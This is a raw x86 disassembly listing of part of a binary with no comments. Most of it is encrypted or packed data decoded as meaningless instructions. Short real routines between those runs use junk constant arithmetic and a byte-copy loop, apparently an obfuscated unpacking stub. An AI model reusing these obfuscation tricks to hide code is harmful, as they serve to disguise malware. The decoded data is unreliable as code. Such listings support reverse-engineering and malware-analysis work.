  4151a6:	js     0x4151e2
  4151a8:	cmp    dl,BYTE PTR [ebx]
  4151aa:	fwait
  4151ab:	imul   ecx,esi,0x6335b252
  4151b1:	loope  0x415163
  4151b3:	sbb    al,0x20
  4151b5:	aam    0xad
  4151b7:	mov    bl,0xfd
  4151b9:	ins    DWORD PTR es:[edi],dx
  4151ba:	xchg   ebx,eax
  4151bc:	dec    ebx
  4151bd:	pop    ecx
  4151be:	and    eax,0x4f3375
  4151c3:	dec    ebx
  4151c4:	xchg   ecx,eax
  4151c5:	adc    edx,DWORD PTR [edi]
  4151c7:	aas    
  4151c8:	mov    ch,0x7a
  4151ca:	imul   esp,DWORD PTR [ecx+0x42],0x68
  4151ce:	ffreep st(4)
  4151d0:	cwde   
  4151d1:	jb     0x4151ac
  4151d3:	add    al,0x8b
  4151d5:	push   esp
  4151d6:	and    al,0x14
  4151d8:	sub    DWORD PTR [eax],ecx
  4151da:	sbb    DWORD PTR [eax+0x4],edx
  4151dd:	mov    eax,DWORD PTR [esp+0xc]
  4151e1:	or     DWORD PTR [eax],0xca7da575
  4151e7:	or     DWORD PTR [eax+0x4],0x9c1b89e8
  4151ee:	lea    eax,[esp+0x18]
  4151f2:	push   eax
  4151f3:	lea    eax,[esp+0x24]
  4151f7:	push   eax
  4151f8:	call   0x4127df
  4151fd:	mov    eax,DWORD PTR [esp+0x18]
  415201:	mov    ecx,DWORD PTR [esp+0x1c]
  415205:	push   DWORD PTR [ebp+0x18]
  415208:	mov    ebx,DWORD PTR [ebp+0xc]
  41520b:	push   DWORD PTR [ebp+0x14]
  41520e:	mov    esi,DWORD PTR [ebp+0x8]
  415211:	push   DWORD PTR [ebp+0x10]
  415214:	push   DWORD PTR [esp+0x20]
  415218:	push   DWORD PTR [esp+0x20]
  41521c:	push   DWORD PTR [esp+0x38]
  415220:	push   DWORD PTR [esp+0x38]
  415224:	call   0x401000
  415229:	pop    esi
  41522a:	pop    ebx
  41522b:	mov    esp,ebp
  41522d:	pop    ebp
  41522e:	ret    0x14
  415231:	push   ebp
  415232:	mov    ebp,esp
  415234:	sub    esp,0x30
  415237:	mov    DWORD PTR [ebp-0x24],0x7c16
  41523e:	mov    DWORD PTR [ebp-0x20],0x53bd
  415245:	mov    DWORD PTR [ebp-0x18],0x3bd5
  41524c:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  415253:	mov    DWORD PTR [ebp-0xc],0x4b9d
  41525a:	mov    DWORD PTR [ebp-0x8],0x7e48
  415261:	mov    DWORD PTR [ebp-0x4],0x604b
  415268:	mov    DWORD PTR [ebp-0x30],0x5b69
  41526f:	mov    DWORD PTR [ebp-0x2c],0x4521
  415276:	mov    DWORD PTR [ebp-0x28],0x2979
  41527d:	mov    DWORD PTR [ebp-0x14],0x9e8
  415284:	mov    DWORD PTR [ebp-0x10],0x40e5
  41528b:	mov    ecx,DWORD PTR [ebp-0x4]
  41528e:	mov    eax,DWORD PTR [ebp-0x8]
  415291:	add    ecx,0x1d04
  415297:	xor    ecx,eax
  415299:	mov    eax,DWORD PTR [ebp-0xc]
  41529c:	and    ecx,0x6f79
  4152a2:	imul   ecx,eax
  4152a5:	xor    ecx,0xe33ab1
  4152ab:	push   esi
  4152ac:	mov    DWORD PTR [ebp-0x4],0x5989
  4152b3:	mov    DWORD PTR [ebp-0x8],0x402c1
  4152ba:	mov    DWORD PTR [ebp-0xc],0x4114
  4152c1:	mov    eax,DWORD PTR [ebp-0xc]
  4152c4:	mov    esi,DWORD PTR [ebp-0x8]
  4152c7:	xor    edx,edx
  4152c9:	sub    eax,0x6cb6
  4152ce:	div    esi
  4152d0:	mov    edx,DWORD PTR [ebp-0x4]
  4152d3:	mov    esi,DWORD PTR [ebp+0xc]
  4152d6:	or     eax,edx
  4152d8:	xor    eax,0x67f1
  4152dd:	mov    edx,ecx
  4152df:	sub    edx,eax
  4152e1:	mov    DWORD PTR [ebp-0x4],edx
  4152e4:	mov    eax,DWORD PTR [ebp-0x4]
  4152e7:	mov    edx,DWORD PTR [ebp-0x4]
  4152ea:	mov    dl,BYTE PTR [edx+esi*1]
  4152ed:	mov    esi,DWORD PTR [ebp+0x8]
  4152f0:	mov    BYTE PTR [eax+esi*1],dl
  4152f3:	jmp    0x415646
  4152f8:	mov    cl,0x4a
  4152fa:	aas    
  4152fb:	(bad)  
  4152fc:	sbb    bh,BYTE PTR [edx-0x5f]
  4152ff:	sub    dh,BYTE PTR [esi+0x647e1b8c]
  415305:	and    cl,al
  415307:	mov    al,0xbc
  415309:	push   cs
  41530a:	push   ss
  41530b:	sbb    BYTE PTR [ebp-0x6fe7e7ee],dh
  415311:	aas    
  415312:	scas   al,BYTE PTR es:[edi]
  415313:	xor    DWORD PTR [esi],edx
  415315:	adc    DWORD PTR fs:[esi-0xb884009],0xffffff8f
  41531d:	pop    ds
  41531e:	jb     0x415334
  415320:	cmp    eax,0x4a4f9280
  415325:	fist   DWORD PTR [ebp+edx*8-0x6b]
  415329:	pop    eax
  41532a:	repz sar DWORD PTR [ecx+0x3bd16d5c],0x88
  415332:	add    DWORD PTR [esi-0x3c],ebp
  415335:	lea    eax,[ecx+edi*2]
  415338:	lock dec ebp
  41533a:	add    DWORD PTR [edi-0x7c],edx
  41533d:	pop    esp
  41533e:	fmul   QWORD PTR [ebp+0x7d2c8f9b]
  415344:	sahf   
  415345:	pop    esi
  415346:	inc    edi
  415347:	inc    edx
  415348:	add    BYTE PTR [ebp-0x4dde5cd4],dl
  41534e:	lds    eax,FWORD PTR [ebx+0x3a]
  415351:	std    
  415352:	fsub   st(1),st
  415354:	mov    al,ds:0xafdbd73a
  415359:	pop    ecx
  41535b:	ins    DWORD PTR es:[edi],dx
  41535c:	push   ss
  41535d:	imul   esi,DWORD PTR [ebx+0x76821d71],0x73
  415364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415365:	ret    
  415366:	test   DWORD PTR [edi-0x42],edi
  415369:	push   ebp
  41536a:	pop    ds
  41536b:	lods   eax,DWORD PTR ds:[esi]
  41536c:	arpl   bx,cx
  41536e:	xchg   edx,eax
  41536f:	fs (bad) 
  415371:	add    DWORD PTR [ecx+0x63],ecx
  415374:	dec    ebx
  415375:	pop    es
  415376:	int    0x18
  415378:	push   DWORD PTR [esi]
  41537a:	ds adc eax,0xa0431f06
  415380:	jbe    0x41537d
  415382:	rcl    ebp,cl
  415384:	inc    esi
  415385:	mov    dh,bh
  415387:	jbe    0x41530d
  415389:	mov    edx,0x2d4dde67
  41538e:	jl     0x415376
  415390:	ret    
  415391:	cdq    
  415392:	add    bh,BYTE PTR [bx+si-0x2]
  415396:	js     0x4153dd
  415398:	jl     0x41532b
  41539a:	fisttp QWORD PTR [ecx+edx*1-0x53d53840]
  4153a1:	and    bl,BYTE PTR [edi-0x57]
  4153a4:	add    BYTE PTR [ebx],al
  4153a6:	or     DWORD PTR [ecx],edi
  4153a8:	packuswb mm0,QWORD PTR [edi]
  4153ab:	and    eax,0x45b56768
  4153b0:	call   FWORD PTR [ecx-0x1f357533]
  4153b6:	sub    al,0x8
  4153b8:	cdq    
  4153b9:	push   edx
  4153ba:	dec    edx
  4153bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153bc:	push   cs
  4153bd:	xor    BYTE PTR [ebx],bl
  4153bf:	fadd   DWORD PTR [esi-0x20f4985f]
  4153c5:	lea    edx,[edx+edx*8+0x3937227f]
  4153cc:	data16 (bad) 
  4153ce:	and    ebx,esp
  4153d0:	push   edi
  4153d1:	ss jno 0x2e0c1de7
  4153d8:	stos   DWORD PTR es:[edi],eax
  4153d9:	and    BYTE PTR [edi],dl
  4153db:	(bad)  
  4153dd:	mov    esp,0x562e1df2
  4153e2:	jmp    0x6c82:0x35713097
  4153e9:	xor    eax,0x5dca903b
  4153ee:	jmp    0x76bb714b
  4153f3:	push   edi
  4153f4:	mov    ah,0x82
  4153f6:	xchg   BYTE PTR [edi-0xfbc6ebf],ah
  4153fc:	xchg   DWORD PTR [edx-0x5a],ecx
  4153ff:	(bad)  
  415400:	lock xor ebx,ebx
  415403:	inc    esp
  415404:	or     DWORD PTR [edi],0xa1668210
  41540a:	iret   
  41540b:	sub    ecx,DWORD PTR [eax+0x59]
  41540e:	xchg   ebx,eax
  41540f:	adc    ebp,eax
  415411:	inc    ebx
  415412:	xor    ch,BYTE PTR [edi+edx*1+0x18]
  415416:	(bad)  
  415417:	test   BYTE PTR [esi+0x76244bff],0x51
  41541e:	jle    0x4153fd
  415420:	mov    WORD PTR [ebx+esi*1],ds
  415423:	cli    
  415424:	arpl   WORD PTR [ebp-0x24eb4670],ax
  41542a:	cmp    BYTE PTR [eax+0x62cf8bc4],0xda
  415431:	push   ebx
  415432:	lods   eax,DWORD PTR ds:[esi]
  415433:	dec    edi
  415434:	aad    0x31
  415436:	mov    esi,0x69ddd4a
  41543b:	jmp    0xd959:0xd0ffb47b
  415442:	inc    eax
  415443:	inc    bx
  415445:	into   
  415446:	xchg   esp,eax
  415447:	mov    al,0xfc
  415449:	lock dec esp
  41544b:	sub    DWORD PTR ds:0x40957518,edx
  415451:	daa    
  415452:	jns    0x41549b
  415454:	mov    ds:0xa63a5f23,al
  415459:	repz cmp al,dl
  41545c:	xchg   ecx,eax
  41545d:	imul   ebp,DWORD PTR [ecx],0x739b377d
  415463:	mov    ebp,0x113efbc2
  415468:	ficom  DWORD PTR [edi]
  41546a:	inc    esi
  41546b:	jnp    0x4154d9
  41546d:	cld    
  41546e:	imul   edi,DWORD PTR [ebx-0x45],0xd09d84a9
  415475:	out    0x95,al
  415477:	mov    dh,0xf7
  415479:	mov    WORD PTR [ebx+0x1e],ss
  41547c:	mov    al,BYTE PTR [eax+0x72]
  41547f:	clc    
  415480:	push   0x9868bad7
  415485:	fcomp  DWORD PTR [ecx+0xf82726e]
  41548b:	add    BYTE PTR [edi+0x17],ah
  41548e:	inc    eax
  41548f:	sbb    eax,0x990a9e87
  415494:	and    cl,dl
  415496:	fimul  DWORD PTR [ecx-0x4babf4c7]
  41549c:	lock js 0x4154eb
  41549f:	in     al,0x7c
  4154a1:	push   ds
  4154a2:	xor    al,0x4
  4154a4:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4154a6:	lock mov eax,0x1ecc2c70
  4154ac:	mov    bl,BYTE PTR [ebx+eiz*2+0x2c]
  4154b0:	adc    al,al
  4154b2:	pop    esi
  4154b3:	aas    
  4154b4:	mov    ch,0xc
  4154b6:	rol    BYTE PTR [ebp-0x7d201df3],0xdf
  4154bd:	mov    ebp,0x7731932
  4154c2:	es cmp al,0xa9
  4154c5:	fdiv   QWORD PTR [ebx]
  4154c7:	es jp  0x4154f9
  4154ca:	xchg   ebx,eax
  4154cb:	pop    ebp
  4154cc:	jns    0x41550e
  4154ce:	loop   0x415546
  4154d0:	mov    edi,0xa9ce2591
  4154d5:	mov    esi,0x9359ef3f
  4154da:	arpl   dx,bx
  4154dc:	adc    al,BYTE PTR [esi]
  4154de:	lds    eax,FWORD PTR ss:[ecx+0x6092b35e]
  4154e5:	cmc    
  4154e6:	push   ebx
  4154e7:	push   0xdf4ceeb8
  4154ec:	dec    edx
  4154ed:	les    ebp,FWORD PTR [ebx+edi*1]
  4154f0:	cmp    ebx,DWORD PTR [ecx-0x1e]
  4154f3:	mov    dl,0xfa
  4154f5:	setle  bl
  4154f8:	cmp    BYTE PTR [ecx-0xc959628],bh
  4154fe:	add    bh,BYTE PTR [edx-0x24]
  415501:	jbe    0x415558
  415503:	inc    edi
  415504:	punpckhdq mm2,mm5
  415507:	lods   al,BYTE PTR ds:[esi]
  415508:	lahf   
  415509:	(bad)  
  41550a:	jmp    0xbd7c:0xf2ae269b
  415511:	mov    eax,DWORD PTR [ebp-0x3a0d8bb8]
  415517:	pop    ds
  415518:	popf   
  415519:	push   edi
  41551a:	mov    ds,WORD PTR [ebx+ebx*8+0x63]
  41551e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41551f:	lea    ebp,[eax+0x2de2894e]
  415525:	lahf   
  415526:	loope  0x415554
  415528:	scas   al,BYTE PTR es:[edi]
  415529:	sbb    eax,0xeca5e2cb
  41552e:	dec    ecx
  41552f:	aam    0x3c
  415531:	iret   
  415532:	test   BYTE PTR [edi],dl
  415534:	ins    BYTE PTR es:[edi],dx
  415535:	sub    BYTE PTR [ebx],dh
  415537:	aaa    
  415538:	ins    DWORD PTR es:[edi],dx
  415539:	or     BYTE PTR [ecx+0x3c0d297e],dh
  41553f:	loop   0x415509
  415541:	scas   al,BYTE PTR es:[edi]
  415542:	cmp    esi,DWORD PTR [ecx]
  415544:	ret    
  415545:	sub    ebx,DWORD PTR [ebp+0x38825c64]
  41554b:	icebp  
  41554c:	cmp    DWORD PTR [ecx],eax
  41554e:	sub    cl,ah
  415550:	push   eax
  415551:	mov    cl,0xf0
  415553:	mov    BYTE PTR ds:0x6dcfc730,0x14
  41555a:	sub    DWORD PTR [ebx+ebx*4+0x1be28aa3],edx
  415561:	sub    BYTE PTR [esi+0x62737fe2],dh
  415567:	mov    eax,0xe05c8807
  41556c:	hlt    
  41556d:	out    0x11,eax
  41556f:	outs   dx,BYTE PTR ds:[esi]
  415570:	scas   al,BYTE PTR es:[edi]
  415571:	dec    DWORD PTR ds:0xc8a0804f
  415577:	lock push ecx
  415579:	dec    edx
  41557a:	adc    BYTE PTR [ecx-0x74],cl
  41557d:	xchg   edi,eax
  41557e:	mov    bh,0xb1
  415580:	lods   eax,DWORD PTR ds:[esi]
  415581:	lods   al,BYTE PTR ds:[esi]
  415582:	jg     0x41559c
  415584:	adc    bl,ch
  415586:	popa   
  415587:	cmp    DWORD PTR [ebx],edi
  415589:	test   al,0x76
  41558b:	mov    ebp,0xe4b3826b
  415590:	or     al,0xc4
  415592:	fldcw  WORD PTR [edi+0x32f26ac5]
  415598:	push   ebp
  415599:	and    DWORD PTR [ebp*8-0x14720e43],edx
  4155a0:	call   0x8b8371a7
  4155a5:	(bad)  
  4155a6:	cld    
  4155a7:	xchg   ebx,eax
  4155a8:	pop    esp
  4155a9:	cli    
  4155aa:	call   0xe3e6d8ff
  4155af:	je     0x415552
  4155b1:	pop    DWORD PTR [ebp-0x106fb7ee]
  4155b7:	imul   eax,DWORD PTR [edx+edi*2],0xb2ee1e1f
  4155be:	lahf   
  4155bf:	mov    al,0x30
  4155c1:	ret    
  4155c2:	inc    edx
  4155c3:	mov    ds:0x296e82ef,eax
  4155c8:	add    eax,0xf4adafc6
  4155cd:	jnp    0x4155aa
  4155cf:	test   BYTE PTR [ebp+0x3f],bl
  4155d2:	xchg   esp,eax
  4155d3:	xor    BYTE PTR [ebx+0x7e7fcd23],bl
  4155d9:	or     al,0xbf
  4155db:	fsub   DWORD PTR [ebx+0x6bb80888]
  4155e1:	mov    cs,WORD PTR [edx-0x2d0ece80]
  4155e7:	in     eax,dx
  4155e8:	dec    edi
  4155e9:	int    0x8c
  4155eb:	and    ah,dh
  4155ed:	adc    al,0x1d
  4155ef:	cmp    ebp,DWORD PTR [eax-0x53]
  4155f2:	xlat   BYTE PTR ds:[ebx]
  4155f4:	pop    ecx
  4155f5:	cmp    eax,0x3cec3a3
  4155fa:	xchg   edx,eax
  4155fb:	popf   
  4155fc:	jmp    0xb8836440
  415601:	(bad)  
  415602:	nop
  415603:	push   0x74164ab3
  415608:	sub    al,0x1f
  41560a:	or     bh,BYTE PTR [ecx]
  41560c:	rcr    DWORD PTR [esi+0x3b],1
  41560f:	lods   al,BYTE PTR ds:[esi]
  415610:	loope  0x4155a1
  415612:	jecxz  0x41568a
  415614:	add    DWORD PTR [edi+0x6c506e59],eax
  41561a:	or     eax,0x4fc30ce9
  41561f:	out    dx,eax
  415620:	sub    DWORD PTR [ebx+0x4970119],esi
  415626:	lahf   
  415627:	bound  edx,QWORD PTR [eax-0x21]
  41562a:	je     0x4155e5
  41562c:	mov    ebx,esi
  41562e:	fdivp  st(3),st
  415630:	dec    edx
  415631:	call   0x5db8:0x4f81dbe1
  415638:	(bad)  
  415639:	jno    0x415605
  41563b:	sub    eax,0x2e1bfbe8
  415640:	lds    ebp,FWORD PTR [ecx-0x61]
  415643:	pop    es
  415644:	retf   0x8b0f
  415647:	inc    ebp
  415648:	lock mov edx,DWORD PTR [ebp-0x14]
  41564c:	imul   eax,eax,0x43bd290
  415652:	and    eax,edx
  415654:	or     eax,0x1a40
  415659:	xor    eax,0x1ac1
  41565e:	add    ecx,eax
  415660:	mov    eax,DWORD PTR [ebp-0x18]
  415663:	mov    edx,0x7380
  415668:	sub    edx,eax
  41566a:	add    edx,DWORD PTR [ebp-0x1c]
  41566d:	jmp    0x4159c0
  415672:	pop    esp
  415673:	pushf  
  415674:	lds    eax,FWORD PTR [ebp+eax*2+0x1c]
  415678:	pop    esp
  415679:	pushf  
  41567a:	push   ss
  41567b:	cwde   
  41567c:	pop    ebx
  41567d:	jo     0x415655
  41567f:	pop    ss
  415680:	inc    edi
  415681:	push   0x58
  415683:	or     BYTE PTR [esi],dl
  415685:	sbb    BYTE PTR [ebp-0x38e7e7ee],dh
  41568b:	call   0xf19b7d68
  415690:	lds    edi,FWORD PTR [ecx+0x3a]
  415693:	std    
  415694:	fisubr DWORD PTR [ebx+0x1b294bf6]
  41569a:	retf   0xe27f
  41569d:	call   0xf255:0x79b38c77
  4156a4:	xchg   ecx,eax
  4156a5:	inc    edx
  4156a6:	pop    ecx
  4156a7:	ins    BYTE PTR es:[edi],dx
  4156a8:	shl    BYTE PTR [edi+0x125ce79d],1
  4156ae:	mov    esi,0x236c1175
  4156b3:	xchg   edx,eax
  4156b4:	outs   dx,DWORD PTR ds:[esi]
  4156b5:	clc    
  4156b6:	fisub  WORD PTR [edx-0x69]
  4156b9:	push   ebp
  4156ba:	imul   edx,ecx,0x6f25aeeb
  4156c0:	neg    edx
  4156c2:	mov    bh,0xe6
  4156c4:	icebp  
  4156c5:	cmp    dl,bl
  4156c7:	icebp  
  4156c8:	cmp    eax,0x3a3a6d83
  4156cd:	mov    ds:0x5f6e6c13,eax
  4156d2:	sar    bh,0x7e
  4156d5:	cmp    eax,0x4ef24daa
  4156da:	adc    al,0x9d
  4156dc:	and    BYTE PTR [ecx+0x167c9aeb],bl
  4156e2:	sbb    ebx,DWORD PTR [edi+0xdbcc9b6]
  4156e8:	adc    eax,0x61f769af
  4156ed:	mov    cl,BYTE PTR [edx-0x3efd9fa6]
  4156f3:	fsubrp st(4),st
  4156f5:	mov    ds:0x9c92244,eax
  4156fa:	es in  al,0x51
  4156fd:	jl     0x4156d4
  4156ff:	hlt    
  415700:	in     al,dx
  415701:	xor    dh,dh
  415703:	pusha  
  415704:	ret    
  415705:	xchg   ecx,eax
  415706:	push   0x74efecbc
  41570b:	clc    
  41570c:	mov    esi,0x274b4b7f
  415711:	mov    BYTE PTR [edi],bh
  415713:	pop    edi
  415714:	ret    0x236d
  415717:	adc    al,dh
  415719:	shr    DWORD PTR [edi+0x69],0x70
  41571d:	mov    eax,0xac4bfdde
  415722:	jb     0x41573d
  415724:	mov    al,0x28
  415726:	add    al,0xf3
  415728:	mov    esp,0x8bca9f14
  41572d:	push   0xd6e25283
  415732:	call   0xd94b:0x42426c1f
  415739:	ja     0x4157b6
  41573b:	or     al,0x81
  41573d:	retf   0xc165
  415740:	xor    eax,0x7a330068
  415745:	lods   al,BYTE PTR ds:[esi]
  415746:	icebp  
  415747:	je     0x4156cb
  415749:	add    BYTE PTR gs:[edi-0x7e],al
  41574d:	add    bh,BYTE PTR [esi+0x76]
  415750:	and    eax,0xe204170c
  415755:	jecxz  0x415765
  415757:	popa   
  415758:	mov    bl,0x11
  41575a:	push   ecx
  41575b:	dec    edx
  41575c:	sub    edx,DWORD PTR [ebx]
  41575e:	jl     0x4156e3
  415760:	loopne 0x415732
  415762:	pop    ds
  415763:	(bad)  
  415765:	push   ebp
  415766:	push   edi
  415767:	leave  
  415768:	mov    ebx,0x4577249e
  41576d:	jmp    0x40c16b58
  415772:	sti    
  415773:	dec    edi
  415774:	jnp    0x41574e
  415776:	gs inc ebx
  415778:	icebp  
  415779:	in     eax,0x30
  41577b:	popf   
  41577c:	and    bl,BYTE PTR [eax-0x60]
  41577f:	xchg   DWORD PTR [esp+ebx*4-0x16],edx
  415783:	sub    al,0xbe
  415786:	mov    esi,0x12605b8d
  41578b:	test   DWORD PTR [ecx-0x2a1f1805],edx
  415791:	div    DWORD PTR [eax]
  415793:	ficom  WORD PTR [eax+0x68]
  415796:	add    eax,esp
  415798:	mov    ds:0x98841c02,al
  41579d:	dec    ecx
  41579e:	es pop es
  4157a0:	jmp    0x415788
  4157a2:	adc    BYTE PTR [ecx],0xc3
  4157a5:	rcr    BYTE PTR [ebp+ebx*4+0x35],cl
  4157a9:	adc    eax,0x352b9c15
  4157ae:	imul   ebp,DWORD PTR [esi],0xffffffaf
  4157b1:	dec    ecx
  4157b2:	adc    eax,0xe9315aeb
  4157b7:	cli    
  4157b8:	pop    eax
  4157b9:	fs dec ecx
  4157bb:	sti    
  4157bc:	pop    ecx
  4157bd:	jnp    0x415767
  4157bf:	rol    DWORD PTR [ecx+0x32],1
  4157c2:	aad    0x5
  4157c4:	in     al,dx
  4157c5:	cld    
  4157c6:	add    BYTE PTR [ecx],bh
  4157c8:	inc    esp
  4157c9:	imul   ebx,DWORD PTR [ecx+0x29],0xa3c9f062
  4157d0:	or     bl,0xfc
  4157d3:	gs pusha 
  4157d5:	sub    eax,0x574cb939
  4157da:	push   edx
  4157db:	iret   
  4157dc:	int3   
  4157dd:	daa    
  4157de:	xchg   ch,bh
  4157e0:	out    0x32,al
  4157e2:	lock sub eax,DWORD PTR [edx+ebp*8-0x92a6893]
  4157ea:	jbe    0x415858
  4157ec:	mov    bh,0x9e
  4157ee:	lods   al,BYTE PTR ds:[esi]
  4157ef:	jo     0x415819
  4157f1:	(bad)  
  4157f3:	fucomp st(1)
  4157f6:	xor    BYTE PTR ss:[ecx-0x77],ah
  4157fa:	jle    0x4157de
  4157fc:	cmp    al,0x25
  4157fe:	in     al,dx
  4157ff:	push   0xffffffb8
  415801:	mov    bl,0xa5
  415803:	ret    
  415804:	pushf  
  415805:	int    0x71
  415807:	das    
  415808:	aam    0xd4
  41580a:	fistp  WORD PTR [eax-0x4901ba7a]
  415810:	fwait
  415811:	mov    ah,0x37
  415813:	sub    DWORD PTR [edi+0x3e3c96c4],edi
  415819:	repz sti 
  41581b:	adc    dh,al
  41581d:	xchg   DWORD PTR [ecx-0x39],ebx
  415820:	fdivr  st,st(6)
  415822:	push   edi
  415823:	out    0xde,al
  415825:	js     0x4157e7
  415827:	js     0x4157cd
  415829:	pop    ebp
  41582a:	dec    edx
  41582b:	sub    eax,0x3ac4451b
  415830:	js     0x4157ca
  415832:	stc    
  415833:	cli    
  415834:	imul   ebx,ebx,0x391d39ee
  41583a:	das    
  41583b:	out    0xff,al
  41583d:	std    
  41583e:	stc    
  41583f:	adc    BYTE PTR [ecx],bh
  415841:	jg     0x4158b8
  415843:	stc    
  415844:	xchg   esp,eax
  415845:	adc    ecx,ebp
  415847:	in     al,0x24
  415849:	and    BYTE PTR [ecx],al
  41584b:	jmp    0xfa083359
  415850:	xor    bl,BYTE PTR [esp+ebp*2+0x3c]
  415854:	js     0x415879
  415856:	dec    esi
  415857:	fldenv [ebx]
  415859:	or     edi,DWORD PTR [esi]
  41585b:	sub    BYTE PTR [ecx],ch
  41585d:	mov    gs,ebp
  41585f:	sbb    bh,0x6a
  415862:	mov    ebx,0x117a118b
  415867:	or     eax,0x78b0b0d4
  41586c:	mov    DWORD PTR [ebp+0x59],0xf319c1ee
  415873:	aaa    
  415874:	adc    DWORD PTR [edx-0x1d],ecx
  415877:	cs inc esp
  415879:	xchg   ebp,eax
  41587a:	mov    edx,0x72362895
  41587f:	scas   eax,DWORD PTR es:[edi]
  415880:	(bad)
  415883:	lea    ecx,[ecx-0x7c970ca0]
  415889:	mov    ch,0xa3
  41588b:	and    eax,0xd2615e07
  415890:	shl    BYTE PTR [esi-0x17],0x93
  415894:	out    0xb6,eax
  415896:	arpl   WORD PTR cs:[ecx-0x5d7ec088],cx
  41589d:	jae    0x415903
  41589f:	ins    DWORD PTR es:[edi],dx
  4158a0:	cmp    bh,dh
  4158a2:	dec    ecx
  4158a3:	fist   WORD PTR [esi+eiz*4-0x6c]
  4158a7:	xchg   bl,al
  4158a9:	push   es
  4158aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158ab:	push   edi
  4158ac:	fisttp DWORD PTR [bp+di]
  4158af:	jmp    DWORD PTR [ecx+0x6fcf2bc3]
  4158b5:	lea    ebx,[ecx-0x4cab6a59]
  4158bb:	loope  0x415904
  4158bd:	dec    ebx
  4158be:	pushf  
  4158bf:	mov    esi,0xdadaab53
  4158c4:	and    dh,bl
  4158c6:	scas   eax,DWORD PTR es:[edi]
  4158c7:	jg     0x415944
  4158c9:	scas   eax,DWORD PTR es:[edi]
  4158ca:	daa    
  4158cb:	dec    ecx
  4158cc:	inc    edi
  4158cd:	sbb    bh,ch
  4158cf:	xchg   BYTE PTR [ebx],bh
  4158d1:	(bad)  
  4158d3:	aam    0xbe
  4158d5:	add    BYTE PTR [ecx+edi*1+0x13],dh
  4158d9:	cmp    BYTE PTR [edx+0x6365a6f0],ah
  4158df:	dec    esi
  4158e0:	sbb    al,0xce
  4158e2:	push   0xffffffcb
  4158e4:	cmp    al,0x74
  4158e6:	sbb    BYTE PTR [edi],bh
  4158e8:	xchg   ecx,eax
  4158e9:	jecxz  0x41588d
  4158eb:	sub    DWORD PTR [esi-0x56bbf138],esp
  4158f1:	sbb    ebx,edi
  4158f3:	jge    0x41596c
  4158f5:	xchg   ebp,eax
  4158f6:	mov    esp,0xc42dfac7
  4158fb:	mov    dl,0x14
  4158fd:	addr16 pop esi
  4158ff:	(bad)  
  415900:	add    eax,0x6190c973
  415905:	xchg   esi,eax
  415906:	rol    BYTE PTR [ebp+eax*2-0x5f],cl
  41590a:	cmc    
  41590b:	ret    
  41590c:	pop    eax
  41590d:	inc    edi
  41590e:	jg     0x4158e8
  415910:	xor    ebx,ecx
  415912:	sub    al,0xb7
  415914:	(bad)  
  415915:	out    0x64,al
  415917:	ret    0x27c
  41591a:	in     al,0xa6
  41591c:	adc    al,BYTE PTR [ebx+0x9]
  41591f:	sti    
  415920:	mov    bl,0x81
  415922:	fild   QWORD PTR [esi]
  415924:	test   al,0x3c
  415926:	mov    edi,0xa4336c87
  41592b:	jmp    0xe03e96ad
  415930:	(bad)  
  415931:	xchg   esp,eax
  415932:	lahf   
  415933:	imul   esi,DWORD PTR [ebx-0x7e262da4],0x675a2866
  41593d:	xor    eax,0x50c8f921
  415942:	call   0x874b:0x7a924b31
  415949:	and    bh,BYTE PTR [edi+edi*2]
  41594c:	int3   
  41594d:	sbb    al,0x19
  41594f:	mov    dl,0xaa
  415951:	jne    0x415914
  415953:	xor    ah,BYTE PTR ds:0xb7a09b2d
  415959:	nop
  41595a:	xchg   ebx,eax
  41595b:	push   edi
  41595c:	cmp    BYTE PTR [ebx],dl
  41595e:	or     BYTE PTR [ebp-0x26],al
  415961:	cld    
  415962:	in     al,dx
  415963:	fnstcw WORD PTR [ebx*2-0x61998052]
  41596a:	inc    edx
  41596b:	and    BYTE PTR [eax],ah
  41596d:	icebp  
  41596e:	aad    0xb
  415970:	cmp    edi,DWORD PTR [eax+0x4d]
  415973:	mov    WORD PTR ds:0xad142b06,ss
  415979:	adc    eax,0x80e29103
  41597e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41597f:	sbb    DWORD PTR [esi-0x7c],ebx
  415982:	cmp    eax,0x29230bac
  415987:	mov    ah,BYTE PTR [ecx]
  415989:	or     edx,DWORD PTR [eax-0x74]
  41598c:	aam    0xfc
  41598e:	dec    edx
  41598f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415990:	(bad)  
  415992:	les    esp,FWORD PTR [eax-0x1a305778]
  415998:	icebp  
  415999:	cld    
  41599a:	mov    DWORD PTR [ecx],edx
  41599c:	mov    bl,0xd9
  41599e:	dec    esp
  41599f:	fcmovnu st,st(2)
  4159a1:	aas    
  4159a2:	xchg   BYTE PTR [ebp+0x2a],dh
  4159a5:	mov    ch,BYTE PTR [edx+ecx*2+0x18]
  4159a9:	sahf   
  4159aa:	ret    0xe981
  4159ad:	and    al,0x2a
  4159af:	xchg   ebp,eax
  4159b0:	bound  eax,QWORD PTR [ecx+0x45d871f4]
  4159b6:	aas    
  4159b7:	or     DWORD PTR [ebx],esp
  4159b9:	sub    ch,BYTE PTR [ebp+0x49]
  4159bc:	xor    al,0xab
  4159be:	ror    ebx,1
  4159c0:	mov    eax,DWORD PTR [ebp-0x20]
  4159c3:	xor    edx,eax
  4159c5:	mov    eax,DWORD PTR [ebp-0x24]
  4159c8:	and    edx,eax
  4159ca:	mov    eax,DWORD PTR [ebp+0x10]
  4159cd:	xor    edx,0x7015
  4159d3:	sub    eax,edx
  4159d5:	mov    edx,DWORD PTR [ebp-0x28]
  4159d8:	mov    esi,DWORD PTR [ebp-0x2c]
  4159db:	and    edx,0x2a7b
  4159e1:	lea    edx,[edx+esi*1-0x3571]
  4159e8:	mov    esi,DWORD PTR [ebp-0x30]
  4159eb:	shr    edx,1
  4159ed:	or     edx,esi
  4159ef:	mov    esi,ecx
  4159f1:	sub    esi,edx
  4159f3:	add    esi,0x4751
  4159f9:	cmp    esi,eax
  4159fb:	jbe    0x4152ac
  415a01:	pop    esi
  415a02:	leave  
  415a03:	ret    0xc
  415a06:	push   ebp
  415a07:	mov    ebp,esp
  415a09:	sub    esp,0x7c
  415a0c:	xor    DWORD PTR ds:0x42823b,ebx
  415a12:	push   ebx
